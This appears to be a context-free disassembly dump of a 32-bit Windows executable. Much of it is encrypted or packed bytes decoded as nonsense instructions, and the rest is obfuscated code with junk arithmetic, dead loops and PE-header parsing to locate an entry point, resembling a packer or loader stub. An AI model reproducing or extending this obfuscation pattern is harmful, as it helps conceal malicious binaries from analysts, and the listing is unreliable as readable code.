  4060e6:	cmp    al,0x26
  4060e8:	xor    al,0xee
  4060ea:	push   cs
  4060eb:	in     al,dx
  4060ec:	sti    
  4060ed:	mov    ebp,0xfbcafd5a
  4060f2:	or     edx,edx
  4060f4:	push   cs
  4060f5:	shl    ebx,0x4f
  4060f8:	dec    esp
  4060f9:	sub    dl,BYTE PTR [ecx+0x7b]
  4060fc:	loopne 0x406111
  4060fe:	std    
  4060ff:	sbb    bl,dl
  406101:	js     0x40616a
  406103:	mov    dl,0xb8
  406105:	aad    0x6
  406107:	dec    ecx
  406108:	push   edi
  406109:	shl    BYTE PTR [esi-0x67b60d45],1
  40610f:	mov    ds:0xbed72f16,al
  406114:	aas    
  406115:	ret    0x744f
  406118:	scas   eax,DWORD PTR es:[edi]
  406119:	js     0x4060f1
  40611b:	mov    edi,0x4734d695
  406120:	mov    edi,DWORD PTR [esi]
  406122:	enter  0xd79,0xa0
  406126:	outs   dx,BYTE PTR ds:[esi]
  406127:	mov    ah,0x68
  406129:	scas   al,BYTE PTR es:[edi]
  40612a:	inc    ebp
  40612b:	push   edx
  40612c:	inc    ebp
  40612d:	ret    
  40612e:	xchg   ecx,eax
  40612f:	and    BYTE PTR [ecx],dh
  406131:	inc    edi
  406132:	pop    ss
  406133:	mov    esi,0x249522ae
  406138:	mov    eax,0xdc5b4da8
  40613d:	jns    0x4060c3
  40613f:	cmp    ecx,DWORD PTR ss:[ebx+0x74]
  406143:	les    ebx,FWORD PTR [edx+0x16]
  406146:	add    edi,DWORD PTR ds:[ebp+ebp*2-0x54]
  40614b:	jp     0x406102
  40614d:	sub    eax,0xf072ccdf
  406152:	(bad)
  406156:	jg     0x40618b
  406158:	aas    
  406159:	outs   dx,DWORD PTR ds:[esi]
  40615a:	pop    edx
  40615b:	push   edi
  40615c:	(bad)  
  40615d:	stc    
  40615e:	mov    bl,0xea
  406160:	sbb    ebp,edi
  406162:	clc    
  406163:	xor    ecx,esi
  406165:	cmp    eax,0x7236bef5
  40616a:	or     edx,esi
  40616c:	adc    DWORD PTR [edi-0x68c4a4d1],ebp
  406172:	call   0x7158:0xb97c8343
  406179:	into   
  40617a:	or     al,0x52
  40617c:	shr    BYTE PTR [ebp+0x2b],0x36
  406180:	cmc    
  406181:	call   0x3f5d:0x470c5f00
  406188:	jle    0x406157
  40618a:	pop    ds
  40618b:	cdq    
  40618c:	jne    0x406154
  40618e:	sbb    eax,0x5a8d35a2
  406193:	test   eax,0xe18ad762
  406198:	cli    
  406199:	mov    ?,WORD PTR ds:0x9688fe21
  40619f:	pop    esi
  4061a0:	test   eax,0xe99b5570
  4061a5:	or     BYTE PTR [edi+0xbbcf24e],al
  4061ab:	pushw  es
  4061ad:	cmc    
  4061ae:	mov    al,ds:0xfdabddd6
  4061b3:	mov    DWORD PTR [edi-0x11504eac],eax
  4061b9:	std    
  4061ba:	sti    
  4061bb:	cmp    dh,BYTE PTR ds:0xe8911223
  4061c1:	daa    
  4061c2:	int    0x26
  4061c4:	sub    esp,DWORD PTR [eax-0x172c2846]
  4061ca:	sub    eax,0xf5823c17
  4061cf:	jmp    0xdf45feef
  4061d4:	cmc    
  4061d5:	outs   dx,DWORD PTR ds:[esi]
  4061d6:	out    dx,al
  4061d7:	imul   edx,DWORD PTR [ebx+eax*8+0x20],0xbbc0db31
  4061df:	xlat   BYTE PTR ds:[ebx]
  4061e0:	xor    al,0x82
  4061e2:	arpl   WORD PTR [ebx-0x6188b6d0],sp
  4061e8:	inc    ecx
  4061e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4061ea:	inc    WORD PTR [ecx+0x76ce7bf0]
  4061f1:	jle    0x406184
  4061f3:	push   edx
  4061f4:	shl    BYTE PTR [eax-0x4995030b],1
  4061fa:	fwait
  4061fb:	ins    BYTE PTR es:[edi],dx
  4061fc:	jg     0x406279
  4061fe:	lahf   
  4061ff:	in     al,0x70
  406201:	fucomi st,st(2)
  406203:	mov    esi,0xcc647e5
  406209:	imul   BYTE PTR [esi-0x52]
  40620c:	test   eax,0xba55576c
  406211:	jae    0x4061af
  406213:	jl     0x406274
  406215:	mov    ebx,0xce5cbedf
  40621a:	mov    ecx,0xa89b51b6
  40621f:	pop    esp
  406220:	lods   al,BYTE PTR ds:[esi]
  406221:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406222:	and    ah,BYTE PTR [ecx+0x737af461]
  406228:	cmp    eax,0x931c64c4
  40622d:	sub    esi,DWORD PTR [ebx+0x65]
  406230:	stos   BYTE PTR es:[edi],al
  406231:	pop    edi
  406232:	ret    
  406233:	outs   dx,BYTE PTR ds:[esi]
  406234:	mov    bh,0xc9
  406236:	push   esi
  406237:	nop
  406238:	sub    BYTE PTR [edx+0x5a],dl
  40623b:	add    BYTE PTR [ebx+0x63cce68c],0x54
  406242:	adc    ch,BYTE PTR [edx+0xb]
  406245:	bound  edx,QWORD PTR [eax+0x5c]
  406248:	xchg   edx,eax
  406249:	rol    BYTE PTR [edi+0xb9daf1e],1
  40624f:	sub    esi,DWORD PTR [ecx]
  406251:	add    al,0x8
  406253:	mov    dh,0xf8
  406255:	sub    DWORD PTR [edx+0x3ca1e231],ebx
  40625b:	cmp    BYTE PTR [edx],dh
  40625d:	xchg   esp,eax
  40625e:	xchg   esi,eax
  40625f:	sub    esi,0x33cef344
  406265:	lock and DWORD PTR ds:0x433723,0x0
  406270:	jmp    0x406282
  406275:	mov    ecx,DWORD PTR ds:0x433723
  40627b:	inc    ecx
  40627c:	mov    DWORD PTR ds:0x433723,ecx
  406282:	cmp    DWORD PTR ds:0x433723,0x1d
  406289:	jae    0x4062c6
  40628f:	cmp    DWORD PTR ds:0x433723,0xb
  406296:	jne    0x4062a7
  40629c:	push   0x3d1a
  4062a1:	call   DWORD PTR ds:0x4120c8
  4062a7:	cmp    DWORD PTR ds:0x433723,0xa
  4062ae:	jne    0x4062c1
  4062b4:	mov    ecx,DWORD PTR ds:0x433723
  4062ba:	inc    ecx
  4062bb:	mov    DWORD PTR ds:0x433723,ecx
  4062c1:	jmp    0x406275
  4062c6:	mov    eax,DWORD PTR [edx+0x194]
  4062cc:	mov    ecx,DWORD PTR [eax]
  4062ce:	mov    eax,DWORD PTR [ecx+0x3c]
  4062d1:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4062d5:	add    eax,ecx
  4062d7:	mov    DWORD PTR [ebp+0x8],esi
  4062da:	mov    DWORD PTR [ebp+0x10],eax
  4062dd:	mov    eax,DWORD PTR [ebp+0x10]
  4062e0:	pop    esi
  4062e1:	test   eax,eax
  4062e3:	je     0x406656
  4062e9:	push   DWORD PTR ds:0x413c0c
  4062ef:	push   DWORD PTR ds:0x4139b8
  4062f5:	mov    eax,DWORD PTR [edx+0x194]
  4062fb:	push   DWORD PTR [eax]
  4062fd:	mov    eax,DWORD PTR [ebp+0x10]
  406300:	jmp    0x40664f
  406305:	lahf   
  406306:	cmp    al,0x1a
  406308:	push   ds
  406309:	pop    ecx
  40630a:	fcomp  DWORD PTR [ebx-0x2e0ee343]
  406310:	cmc    
  406311:	retf   
  406312:	push   cs
  406313:	mov    ch,0x81
  406315:	push   esp
  406316:	aas    
  406317:	jle    0x406397
  406319:	sub    al,0x7d
  40631b:	jle    0x40639b
  40631d:	add    eax,0x71acd9df
  406322:	mov    al,ds:0xb7306f4d
  406327:	mov    ecx,0x8971748f
  40632c:	pop    ss
  40632d:	ds xchg ebx,eax
  40632f:	adc    al,0x2b
  406331:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406332:	gs es jns 0x4062c9
  406336:	loop   0x406368
  406338:	sub    DWORD PTR [edx+0x161e3d7f],ecx
  40633e:	test   DWORD PTR [ecx-0x9],0x8b2dabd4
  406345:	stc    
  406346:	push   ebp
  406347:	ss into 
  406349:	mov    gs,WORD PTR [edi-0x9f828d6]
  40634f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406350:	mov    ds:0x33ab73ff,eax
  406355:	xchg   BYTE PTR [ecx+0x4e],bl
  406358:	jp     0x406347
  40635a:	mov    ch,0x9f
  40635c:	jb     0x4063ad
  40635e:	ficomp WORD PTR [ecx*2+0x23cdbc53]
  406365:	dec    ebp
  406366:	into   
  406367:	mov    al,0x7b
  406369:	outs   dx,BYTE PTR ds:[esi]
  40636a:	leave  
  40636b:	mov    edi,0xb2326770
  406370:	fwait
  406371:	icebp  
  406372:	in     eax,dx
  406373:	out    dx,al
  406374:	out    0x3f,eax
  406376:	pop    es
  406377:	add    DWORD PTR [edi-0x757f69dd],ebp
  40637d:	adc    eax,0x7ebae887
  406382:	std    
  406383:	fadd   DWORD PTR [eax-0x40]
  406386:	dec    ecx
  406387:	mov    ss,WORD PTR [edx]
  406389:	inc    eax
  40638a:	pop    ebp
  40638b:	jb     0x406380
  40638d:	pop    ebx
  40638e:	imul   eax,DWORD PTR [edi+0xe46ef95],0xbd8cc6cd
  406398:	lock push ecx
  40639a:	add    esp,0xffffffe8
  40639d:	outs   dx,BYTE PTR ds:[esi]
  40639e:	mov    eax,0x26846be5
  4063a3:	push   eax
  4063a4:	test   al,0x1f
  4063a6:	call   0xb99d:0xf1d69356
  4063ad:	neg    ch
  4063af:	loop   0x406407
  4063b1:	call   0x658259a2
  4063b6:	xor    DWORD PTR [ecx+eax*8-0x58],eax
  4063ba:	jns    0x4063e9
  4063bc:	sbb    cl,BYTE PTR [ecx+0x68]
  4063bf:	out    dx,al
  4063c0:	mov    ?,WORD PTR [eax+0x60]
  4063c3:	sbb    DWORD PTR [ebx+ebx*8+0x2b],ebx
  4063c7:	ins    DWORD PTR es:[edi],dx
  4063c8:	jae    0x4063e3
  4063ca:	popf   
  4063cb:	mov    eax,gs
  4063cd:	das    
  4063ce:	add    al,0xe5
  4063d0:	sub    cl,al
  4063d2:	rcr    DWORD PTR [ebx],1
  4063d4:	xchg   ecx,eax
  4063d5:	cmp    bl,0xb5
  4063d8:	inc    eax
  4063d9:	pop    edi
  4063da:	ins    DWORD PTR es:[edi],dx
  4063db:	ficom  WORD PTR [ecx]
  4063dd:	inc    ebp
  4063de:	mov    eax,0x10209170
  4063e3:	push   cs
  4063e4:	xchg   esp,eax
  4063e5:	and    al,0x98
  4063e7:	add    edx,DWORD PTR [edx-0x4cfff28a]
  4063ed:	mov    cl,0x87
  4063ef:	xchg   ebp,eax
  4063f0:	nop
  4063f1:	cmp    BYTE PTR [esi],ah
  4063f3:	fwait
  4063f4:	and    esi,DWORD PTR [ebp-0x28]
  4063f7:	sahf   
  4063f8:	popa   
  4063f9:	test   BYTE PTR [ebp+0x58e88eed],0x82
  406400:	adc    eax,0x58e82f92
  406405:	jmp    0x9e0c:0xea4fc8ac
  40640c:	(bad)  
  40640d:	fld    DWORD PTR [ecx]
  40640f:	test   DWORD PTR [eax],ebx
  406411:	mov    al,ds:0x5304d17a
  406416:	not    edx
  406418:	jns    0x406442
  40641a:	push   ebp
  40641b:	stc    
  40641c:	out    0x56,al
  40641e:	add    DWORD PTR [esi+ecx*8+0x44acaa2],esi
  406425:	shr    ah,0xf4
  406428:	cli    
  406429:	xchg   ebp,eax
  40642a:	add    dl,BYTE PTR [ecx]
  40642c:	popa   
  40642d:	push   ds
  40642e:	inc    edi
  40642f:	xlat   BYTE PTR ds:[ebx]
  406430:	add    ebp,ecx
  406432:	aas    
  406433:	xor    al,0x27
  406435:	outs   dx,BYTE PTR ds:[esi]
  406436:	inc    ebp
  406437:	xchg   edx,eax
  406438:	ins    DWORD PTR es:[edi],dx
  406439:	or     BYTE PTR [esi+0xa727a76],cl
  40643f:	push   es
  406440:	sbb    BYTE PTR [esi-0x22],bl
  406443:	in     al,0x23
  406445:	call   0x7b394d33
  40644a:	inc    edx
  40644b:	mov    DWORD PTR [ebx-0x557a5e1e],0xd8345b5f
  406455:	das    
  406456:	mov    eax,ds:0xf26a82d1
  40645b:	enter  0xf41e,0x1
  40645f:	ja     0x406419
  406461:	ret    
  406462:	ret    0xbd54
  406465:	adc    ebp,esp
  406467:	(bad)  
  406469:	js     0x406433
  40646b:	jno    0x40642f
  40646d:	mov    ds:0x37c047be,eax
  406472:	loop   0x4064ea
  406474:	ja     0x40646d
  406476:	mov    al,0x9
  406478:	dec    eax
  406479:	imul   esi,ebx,0x2
  40647c:	mov    dh,0x14
  40647e:	inc    ecx
  40647f:	and    DWORD PTR [esi-0x1a],0xffffffec
  406483:	aam    0xd2
  406485:	jno    0x4064e3
  406487:	addr16 cli 
  406489:	sahf   
  40648a:	jne    0x406461
  40648c:	pop    edx
  40648d:	out    dx,eax
  40648e:	loopne 0x406493
  406490:	add    dh,BYTE PTR [ecx-0x511cef11]
  406496:	inc    ebx
  406497:	cmp    ah,BYTE PTR ds:0xd9ce76dd
  40649d:	and    ah,BYTE PTR [ebx+0x62775693]
  4064a3:	jns    0x40643a
  4064a5:	pop    ss
  4064a6:	inc    ebx
  4064a7:	scas   al,BYTE PTR es:[edi]
  4064a8:	in     eax,dx
  4064a9:	aad    0xfb
  4064ab:	sub    al,0x14
  4064ad:	pop    ebx
  4064ae:	ret    
  4064af:	scas   al,BYTE PTR es:[edi]
  4064b0:	pop    ebx
  4064b1:	and    eax,0xeed5594d
  4064b6:	sub    al,0x64
  4064b8:	jns    0x4064f0
  4064ba:	ins    BYTE PTR es:[edi],dx
  4064bb:	(bad)  
  4064bd:	mov    ah,0xfe
  4064bf:	(bad)  
  4064c0:	std    
  4064c1:	in     al,dx
  4064c2:	das    
  4064c3:	nop
  4064c4:	and    ch,BYTE PTR [esi]
  4064c6:	test   al,0x36
  4064c8:	sub    bh,BYTE PTR [edx+eax*1-0xc1e876f]
  4064cf:	ins    DWORD PTR es:[edi],dx
  4064d0:	jnp    0x40648b
  4064d2:	push   esi
  4064d3:	adc    ebp,DWORD PTR [eax+ebx*2+0x2dbed72d]
  4064da:	cli    
  4064db:	adc    bl,BYTE PTR [edi+0x5816e818]
  4064e1:	dec    edx
  4064e2:	or     bl,bh
  4064e4:	inc    ebp
  4064e5:	dec    edx
  4064e6:	jne    0x40655c
  4064e8:	push   0x2
  4064ea:	mov    edi,0x131c6a03
  4064ef:	aam    0xfd
  4064f1:	mov    ecx,0x30bc3e58
  4064f6:	xchg   ebx,eax
  4064f7:	shr    DWORD PTR [ecx-0x60],1
  4064fa:	push   0xba9585a8
  4064ff:	sbb    BYTE PTR [esi],bh
  406501:	sbb    esp,DWORD PTR [eax]
  406503:	mov    DWORD PTR [ebx+eiz*1+0x7],eax
  406507:	push   0x7caab7d0
  40650c:	pop    esi
  40650d:	cmp    edi,edx
  40650f:	bound  esi,QWORD PTR [edi]
  406511:	jecxz  0x4064fd
  406513:	xchg   DWORD PTR [ebx+0x277dca37],edi
  406519:	adc    BYTE PTR [ebx+0x4b],bh
  40651c:	mov    eax,0xc52ca8af
  406521:	mov    esp,0x52f640ea
  406526:	xor    eax,0xfbf15a45
  40652b:	int    0x4d
  40652d:	xchg   BYTE PTR [esi+0x7de9e8ec],bl
  406533:	popa   
  406534:	lahf   
  406535:	pop    es
  406536:	scas   eax,DWORD PTR es:[edi]
  406537:	jne    0x4064ba
  406539:	add    edx,DWORD PTR [esi]
  40653b:	neg    BYTE PTR [edx-0x10]
  40653e:	jmp    0xb5a3:0xe5fb9d4b
  406545:	add    eax,0x2f4e5fce
  40654a:	inc    ebp
  40654b:	out    dx,al
  40654c:	into   
  40654d:	jo     0x4065a6
  40654f:	pop    esi
  406551:	fwait
  406552:	sbb    ecx,DWORD PTR [edi+0x42]
  406555:	cmp    al,0x58
  406557:	add    al,cl
  406559:	(bad)  
  40655a:	push   ebp
  40655b:	pop    esp
  40655c:	cmp    al,0x65
  40655e:	jns    0x4065b3
  406560:	pop    ebx
  406561:	cmp    ebx,DWORD PTR [edi]
  406563:	fbstp  TBYTE PTR [ebx+edi*8-0x50c1b7af]
  40656a:	(bad)  
  40656b:	lods   al,BYTE PTR ds:[esi]
  40656c:	imul   ecx,DWORD PTR [ebx-0x1a],0x66
  406570:	sbb    dl,dl
  406572:	add    ah,ch
  406574:	fidiv  WORD PTR ds:0xa2a3dc86
  40657a:	or     bl,BYTE PTR [esi+ebx*2-0x60e08994]
  406581:	push   eax
  406582:	jae    0x4065a9
  406584:	ret    
  406585:	arpl   WORD PTR ds:0x710d4f4,si
  40658b:	jle    0x40650d
  40658d:	pop    eax
  40658e:	shr    BYTE PTR [ebp-0x5fe11d7c],0xd7
  406595:	cld    
  406596:	leave  
  406597:	jmp    0x4065b6
  406599:	mov    ds:0xf2a67e23,eax
  40659e:	push   ecx
  40659f:	cmc    
  4065a0:	fisub  WORD PTR [ebx-0x1]
  4065a3:	ret    0x75d4
  4065a6:	push   edi
  4065a7:	pushf  
  4065a8:	jg     0x4065a0
  4065aa:	adc    al,0x8e
  4065ac:	mov    BYTE PTR [eax],dh
  4065ae:	and    al,0x6b
  4065b0:	ja     0x40658e
  4065b2:	xchg   ebp,eax
  4065b3:	dec    DWORD PTR [ebx]
  4065b5:	in     eax,dx
  4065b6:	and    eax,0x989572e7
  4065bb:	cmp    ebx,0xffffff9b
  4065be:	daa    
  4065bf:	in     eax,dx
  4065c0:	sbb    DWORD PTR fs:[ebx],esi
  4065c3:	mov    ecx,0x7d739300
  4065c8:	push   es
  4065c9:	lods   al,BYTE PTR ds:[esi]
  4065ca:	cmp    eax,0xf2308ca9
  4065cf:	jne    0x4065cc
  4065d1:	daa    
  4065d2:	dec    ebp
  4065d3:	add    dl,BYTE PTR [eax+0x26611b13]
  4065d9:	adc    eax,edx
  4065db:	(bad)  
  4065dc:	adc    DWORD PTR [edx-0x53],esp
  4065df:	je     0x4065f1
  4065e1:	xor    al,0x20
  4065e3:	or     BYTE PTR [edi+esi*1+0x4],cl
  4065e7:	cmp    eax,0xd38e8ce1
  4065ec:	adc    edi,DWORD PTR [edi]
  4065ee:	xor    eax,0x7d218d6c
  4065f3:	inc    esp
  4065f4:	xlat   BYTE PTR ds:[ebx]
  4065f5:	(bad)  
  4065f6:	into   
  4065f7:	aam    0x11
  4065f9:	xor    BYTE PTR [ecx+0x40723aa6],bl
  4065ff:	cmp    BYTE PTR [edi],dh
  406601:	sbb    BYTE PTR [eax+esi*2],bh
  406604:	inc    ecx
  406605:	enter  0xfb9f,0xc3
  406609:	dec    ebx
  40660a:	rol    DWORD PTR [eax],0x7b
  40660d:	push   es
  40660e:	pop    es
  40660f:	sbb    eax,0xb173810f
  406614:	daa    
  406615:	addr16 inc edx
  406617:	sub    al,0xdb
  406619:	std    
  40661a:	xor    eax,0x7317a22f
  40661f:	mov    ah,0x9f
  406621:	loop   0x40668f
  406623:	mov    ah,0x83
  406625:	sti    
  406626:	(bad)  
  406627:	imul   ebx,DWORD PTR [ebx-0x47],0x2c
  40662b:	inc    edx
  40662c:	data16 cmp ah,BYTE PTR [ecx]
  40662f:	mov    dh,BYTE PTR [ecx+0x1d4e29cd]
  406635:	or     dh,BYTE PTR [edx]
  406637:	arpl   WORD PTR [eax+0x373adab3],bx
  40663d:	cmp    edx,DWORD PTR [ebx]
  40663f:	xlat   BYTE PTR ds:[ebx]
  406640:	hlt    
  406641:	cld    
  406642:	pushf  
  406643:	cmp    eax,0x3b8b5560
  406648:	sub    eax,0xbaec4baa
  40664d:	enter  0xff13,0xd0
  406651:	jmp    0x406659
  406656:	mov    eax,DWORD PTR [ebp+0x10]
  406659:	leave  
  40665a:	ret    0xc
  40665d:	push   ebp
  40665e:	mov    ebp,esp
  406660:	sub    esp,0x28
  406663:	push   0x413cb4
  406668:	call   DWORD PTR ds:0x412408
  40666e:	mov    DWORD PTR ds:0x4335fb,0x6571
  406678:	cmp    WORD PTR [eax],0x0
  40667c:	jne    0x406afe
  406682:	push   0x413d04
  406687:	call   DWORD PTR ds:0x412404
  40668d:	mov    DWORD PTR ds:0x4336d3,0x5ed5
  406697:	cmp    BYTE PTR [eax],0x0
  40669a:	mov    DWORD PTR ds:0x4336a7,0x18c3
  4066a4:	jne    0x406b09
  4066aa:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4066b1:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4066b8:	lea    eax,[ebp-0x20]
  4066bb:	mov    DWORD PTR [ebp-0x14],eax
  4066be:	lea    eax,[ebp-0x1c]
  4066c1:	and    DWORD PTR ds:0x4336e3,0x0
  4066cb:	mov    ecx,DWORD PTR ds:0x4336e3
  4066d1:	inc    ecx
  4066d2:	mov    DWORD PTR ds:0x4336e3,ecx
  4066d8:	cmp    DWORD PTR ds:0x4336e3,0x5
  4066df:	jne    0x4066f8
  4066e5:	push   0x2ad8
  4066ea:	push   DWORD PTR [ebp-0x1c]
  4066ed:	push   0x433803
  4066f2:	call   DWORD PTR ds:0x412340
  4066f8:	cmp    DWORD PTR ds:0x4336e3,0x4
  4066ff:	jne    0x406714
  406705:	xor    ecx,ecx
  406707:	or     ecx,DWORD PTR ds:0x4336e3
  40670d:	inc    ecx
  40670e:	mov    DWORD PTR ds:0x4336e3,ecx
  406714:	cmp    DWORD PTR ds:0x4336e3,0x1f
  40671b:	jb     0x4066cb
  406721:	movzx  ecx,WORD PTR ds:0x4336d7
  406728:	and    ecx,DWORD PTR ds:0x43360f
  40672e:	mov    DWORD PTR ds:0x4336d7,ecx
  406734:	mov    DWORD PTR [ebp-0x10],eax
  406737:	adc    DWORD PTR ds:0x43361b,ecx
  40673d:	mov    eax,ds:0x413b34
  406742:	sbb    ecx,DWORD PTR ds:0x43372b
  406748:	mov    eax,DWORD PTR [eax+0x1c8]
  40674e:	mov    eax,DWORD PTR [eax]
  406750:	sub    DWORD PTR ds:0x433613,ebx
  406756:	mov    ecx,DWORD PTR [ebp-0x10]
  406759:	push   ebx
  40675a:	xor    DWORD PTR ds:0x43366b,edx
  406760:	push   esi
  406761:	and    DWORD PTR ds:0x433607,0x0
  40676b:	jmp    0x40677d
  406770:	mov    ebx,DWORD PTR ds:0x433607
  406776:	inc    ebx
  406777:	mov    DWORD PTR ds:0x433607,ebx
  40677d:	cmp    DWORD PTR ds:0x433607,0x1b
  406784:	jae    0x4067ac
  40678a:	cmp    DWORD PTR ds:0x433607,0x23
  406791:	jne    0x4067a7
  406797:	push   0x433833
  40679c:	push   DWORD PTR [ebp-0x18]
  40679f:	push   0x0
  4067a1:	call   DWORD PTR ds:0x412344
  4067a7:	jmp    0x406770
  4067ac:	mov    esi,0x7510854
  4067b1:	sub    DWORD PTR ds:0x4336ab,0x6a10
  4067bb:	xor    eax,esi
  4067bd:	adc    DWORD PTR ds:0x433697,0x4336a7
  4067c7:	push   edi
  4067c8:	mov    edi,0x32729b
  4067cd:	add    eax,edi
  4067cf:	mov    ebx,0x337e
  4067d4:	mov    DWORD PTR [ecx],eax
  4067d6:	mov    eax,ds:0x413e08
  4067db:	cmp    eax,0x23c13046
  4067e0:	mov    eax,DWORD PTR [ebp-0x4]
  4067e3:	mov    ebx,0xf89c853d
  4067e8:	je     0x406824
  4067ee:	or     ecx,DWORD PTR ds:0x4336d3
  4067f4:	mov    ecx,DWORD PTR [ebp-0x8]
  4067f7:	sbb    DWORD PTR ds:0x43366b,0x4ed6
  406801:	xor    eax,esi
  406803:	add    eax,edi
  406805:	sbb    DWORD PTR ds:0x433613,0x43369f
  40680f:	imul   eax,ecx
  406812:	mov    DWORD PTR [ebp-0x8],eax
  406815:	mov    DWORD PTR ds:0x433607,0x49d5
  40681f:	jmp    0x4068d7
  406824:	or     ecx,DWORD PTR ds:0x4336af
  40682a:	xor    eax,esi
  40682c:	and    ecx,0x6df5
  406832:	add    eax,edi
  406834:	xor    ecx,ecx
  406836:	add    ecx,DWORD PTR ds:0x4336e3
  40683c:	and    DWORD PTR ds:0x4336a7,ecx
  406842:	mov    ds:0x413c48,eax
  406847:	mov    ecx,DWORD PTR ds:0x43372b
  40684d:	or     DWORD PTR ds:0x4336e3,ecx
  406853:	mov    eax,DWORD PTR [ebp-0x8]
  406856:	add    DWORD PTR ds:0x43365b,0x62ed
  406860:	xor    eax,esi
  406862:	and    DWORD PTR ds:0x43371f,ebx
  406868:	add    eax,edi
  40686a:	mov    ecx,DWORD PTR ds:0x4336ab
  406870:	sub    DWORD PTR ds:0x4336d3,ecx
  406876:	mov    ds:0x413e08,eax
  40687b:	sbb    ecx,ecx
  40687d:	mov    eax,DWORD PTR [ebp-0x4]
  406880:	and    DWORD PTR ds:0x43360b,ecx
  406886:	mov    ecx,DWORD PTR ds:0x413c48
  40688c:	sbb    DWORD PTR ds:0x433607,0x486c
  406896:	xor    eax,esi
  406898:	adc    DWORD PTR ds:0x433613,0x6147
  4068a2:	add    eax,edi
  4068a4:	cmp    ecx,eax
  4068a6:	mov    DWORD PTR ds:0x43360f,0x4c28
  4068b0:	jne    0x4068d7
  4068b6:	sub    DWORD PTR ds:0x433623,0x43372b
  4068c0:	push   ebx
  4068c1:	or     DWORD PTR ds:0x43369b,0x4336df
  4068cb:	push   DWORD PTR [ebp-0x4]
  4068ce:	push   DWORD PTR [ebp-0x8]
  4068d1:	call   DWORD PTR ds:0x413c40
  4068d7:	mov    eax,ds:0x413b34
  4068dc:	mov    eax,DWORD PTR [eax+0x18c]
  4068e2:	and    DWORD PTR ds:0x4336e7,0x433693
  4068ec:	mov    eax,DWORD PTR [eax]
  4068ee:	mov    DWORD PTR [ebp-0x18],eax
  4068f1:	mov    DWORD PTR [ebp-0x10],ebx
  4068f4:	or     DWORD PTR ds:0x433653,0x1d95
  4068fe:	mov    DWORD PTR [ebp-0x10],ebx
  406901:	sub    DWORD PTR ds:0x43365b,0x4336ef
  40690b:	mov    DWORD PTR [ebp-0x10],ebx
  40690e:	sub    DWORD PTR ds:0x4336ab,0x43366f
  406918:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40691f:	and    DWORD PTR ds:0x43365b,0x43369b
  406929:	mov    DWORD PTR [ebp-0x28],ebx
  40692c:	dec    DWORD PTR ds:0x4335fb
  406932:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  406939:	mov    ebx,DWORD PTR [ebp-0x8]
  40693c:	adc    DWORD PTR ds:0x4335fb,0x433623
  406946:	xor    ebx,esi
  406948:	add    ebx,edi
  40694a:	jmp    0x4069ee
  40694f:	not    DWORD PTR ds:0x4336db
  406955:	mov    eax,DWORD PTR [ebp-0x4]
  406958:	xor    eax,esi
  40695a:	lea    eax,[eax+ebx*1+0x32729b]
  406961:	push   eax
  406962:	mov    eax,DWORD PTR [ebp-0x10]
  406965:	xor    eax,esi
  406967:	lea    eax,[ebp+eax*1+0x3272a3]
  40696e:	push   eax
  40696f:	adc    DWORD PTR ds:0x4335ff,0x8003
  406979:	mov    eax,ds:0x413b34
  40697e:	xor    DWORD PTR ds:0x4336ef,0x2bd0
  406988:	push   DWORD PTR [eax+0x1bc]
  40698e:	call   0x40f058
  406993:	mov    eax,DWORD PTR [ebp-0x4]
  406996:	add    ecx,0x2fd0
  40699c:	xor    eax,esi
  40699e:	and    DWORD PTR ds:0x43371b,0x0
  4069a8:	mov    ecx,DWORD PTR ds:0x43371b
  4069ae:	inc    ecx
  4069af:	mov    DWORD PTR ds:0x43371b,ecx
  4069b5:	cmp    DWORD PTR ds:0x43371b,0x17
  4069bc:	jne    0x4069c8
  4069c2:	call   DWORD PTR ds:0x4120cc
  4069c8:	cmp    DWORD PTR ds:0x43371b,0x11
  4069cf:	jb     0x4069a8
  4069d5:	mov    ecx,DWORD PTR ds:0x433697
  4069db:	adc    ecx,DWORD PTR ds:0x43365f
  4069e1:	mov    DWORD PTR ds:0x433697,ecx
  4069e7:	lea    ebx,[ebx+eax*1+0x32729b]
  4069ee:	mov    eax,DWORD PTR [ebp-0x4]
  4069f1:	mov    ecx,DWORD PTR [ebp-0x4]
  4069f4:	xor    ecx,esi
  4069f6:	xor    eax,esi
  4069f8:	add    eax,ecx
  4069fa:	mov    ecx,DWORD PTR [ebp-0x4]
  4069fd:	xor    ecx,esi
  4069ff:	lea    eax,[eax+ecx*1+0x9757d1]
  406a06:	cmp    ebx,eax
  406a08:	jbe    0x40694f
  406a0e:	mov    eax,DWORD PTR [ebp+0xc]
  406a11:	mov    ds:0x4139b8,eax
  406a16:	mov    eax,DWORD PTR [ebp+0x10]
  406a19:	mov    ds:0x413c0c,eax
  406a1e:	mov    eax,ds:0x4139b8
  406a23:	mov    ecx,DWORD PTR [ebp-0x14]
  406a26:	push   DWORD PTR [ebp-0x18]
  406a29:	sub    eax,edi
  406a2b:	push   DWORD PTR [ebp-0x1c]
  406a2e:	xor    eax,esi
  406a30:	mov    DWORD PTR [ecx],eax
  406a32:	push   DWORD PTR [ebp-0x20]
  406a35:	call   0x40d59f
  406a3a:	sub    eax,edi
  406a3c:	xor    eax,esi
  406a3e:	mov    DWORD PTR [ebp+0xc],eax
  406a41:	mov    ecx,DWORD PTR [ebp-0x4]
  406a44:	mov    eax,DWORD PTR [ebp+0xc]
  406a47:	xor    ecx,esi
  406a49:	add    ecx,edi
  406a4b:	xor    edx,edx
  406a4d:	div    ecx
  406a4f:	mov    ecx,DWORD PTR [ebp-0x8]
  406a52:	cmp    ecx,eax
  406a54:	jne    0x406a5f
  406a5a:	call   0x401000
  406a5f:	lea    eax,[ebp+0x4]
  406a62:	mov    DWORD PTR [ebp-0x24],eax
  406a65:	mov    eax,ds:0x413b34
  406a6a:	push   0x4
  406a6c:	add    eax,0x1cc
  406a71:	push   eax
  406a72:	lea    eax,[ebp-0xc]
  406a75:	push   eax
  406a76:	call   0x40f058
  406a7b:	mov    eax,DWORD PTR [ebp-0xc]
  406a7e:	mov    eax,DWORD PTR [ebp-0x4]
  406a81:	mov    eax,DWORD PTR [ebp-0x8]
  406a84:	mov    DWORD PTR [ebp+0xc],eax
  406a87:	mov    eax,ds:0x413bb8
